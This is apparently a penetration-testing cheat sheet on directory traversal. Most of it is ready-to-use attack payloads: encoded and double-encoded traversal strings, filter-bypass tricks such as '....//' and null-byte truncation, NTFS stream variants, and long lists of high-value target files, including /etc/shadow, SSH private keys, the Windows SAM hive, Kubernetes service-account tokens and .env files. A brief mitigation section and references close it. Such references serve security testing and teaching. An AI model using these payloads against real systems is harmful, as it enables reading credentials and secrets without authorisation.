# Directory Traversal (Path Traversal)

> Directory Traversal exploits insufficient path validation to access files and directories outside the intended directory.

## Summary

- [Basic Payloads](#basic-payloads)
- [URL Encodings](#url-encodings)
- [Filter Bypass](#filter-bypass)
- [Operating System Specifics](#operating-system-specifics)
- [Sensitive Files](#sensitive-files)
- [Mitigation](#mitigation)
- [References](#references)

## Basic Payloads

```
../
..\
../../../etc/passwd
..\..\..\windows\win.ini
../../../../../../../../../../etc/passwd
....//....//....//etc/passwd
..%2f..%2f..%2fetc%2fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
..%5c..%5c..%5cwindows%5cwin.ini
%252e%252e%252f%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

## URL Encodings

| Char | Single | Double | Unicode |
|------|--------|--------|---------|
| `.`  | `%2e` | `%252e` | `%u002e` |
| `/`  | `%2f` | `%252f` | `%u2215` |
| `\`  | `%5c` | `%255c` | `%u2216` |
| `..` | `%2e%2e` | `%252e%252e` | — |

UTF-8 over-long encodings (sometimes accepted by old IIS):

```
..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
..%c1%9c..%c1%9c..%c1%9cetc%c1%9cpasswd
```

## Filter Bypass

### Trim filters

Filter strips `../` once → bypass with `....//`:

```
....//....//....//etc/passwd
..././..././..././etc/passwd
```

### Mixed slashes (Windows-aware servers)

```
..\..\..\windows\win.ini
../..\../..\../..\windows\win.ini
```

### Absolute paths

If filter only blocks `../` but accepts absolute paths:

```
/etc/passwd
file:///etc/passwd
```

### Null byte (legacy)

```
../../etc/passwd%00.jpg
```

### Add a known prefix

If app prepends a directory (`/var/www/uploads/` + input):

```
../../../etc/passwd
```

If app appends an extension (`input + .png`), try truncation or:

```
../../etc/passwd%00
../../etc/passwd#
../../etc/passwd?ignored
```

### Length-based filter trick (PHP path truncation legacy)

```
../../../../../etc/passwd/././././././...(many)
```

## Operating System Specifics

### Linux

- Separator: `/`
- Case-sensitive
- Useful files in `/etc/`, `/proc/`, `/var/log/`

### Windows

- Separator: `\` (and `/` works in most APIs)
- Case-insensitive
- UNC paths: `\\host\share\file`
- 8.3 short names: `PROGRA~1` instead of `Program Files`
- Reserved devices: `CON`, `PRN`, `AUX`, `NUL`, `COM1`-`COM9`, `LPT1`-`LPT9`

### NTFS Alternate Data Streams

```
..\..\..\file.txt::$DATA
..\..\..\file.txt:hidden
```

## Sensitive Files

### Linux

```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/issue
/etc/group
/etc/sudoers
/etc/crontab
/etc/cron.d/*
/etc/cron.daily/*
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/etc/postfix/main.cf
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/root/.ssh/id_rsa
/root/.bash_history
/home/*/.ssh/id_rsa
/home/*/.bash_history
/proc/self/environ
/proc/self/cmdline
/proc/self/status
/proc/version
/var/log/auth.log
/var/log/apache2/access.log
/var/log/nginx/access.log
/var/log/syslog
/.dockerenv
/run/secrets/kubernetes.io/serviceaccount/token
```

### Windows

```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\System32\config\RegBack\SAM
C:\Users\Administrator\NTUSER.DAT
C:\Windows\repair\SAM
C:\Windows\debug\NetSetup.log
C:\inetpub\wwwroot\web.config
C:\xampp\apache\logs\access.log
C:\xampp\apache\conf\httpd.conf
C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### Application files

```
.env
.git/config
.git/HEAD
.svn/wc.db
.htaccess
.htpasswd
config.php
configuration.php
wp-config.php
database.yml
local.settings.json
appsettings.json
docker-compose.yml
```

## Mitigation

- **Canonicalize** the path (resolve symlinks, normalize) then verify it starts with the intended base directory.
- Use **safe APIs** that take a directory handle + filename, not a path string.
- Use **chroot / containers / restricted users** so even successful traversal exposes little.
- Reject inputs containing `..`, `/`, `\`, NUL bytes outright when only a basename is expected.

## References

- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [PortSwigger — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
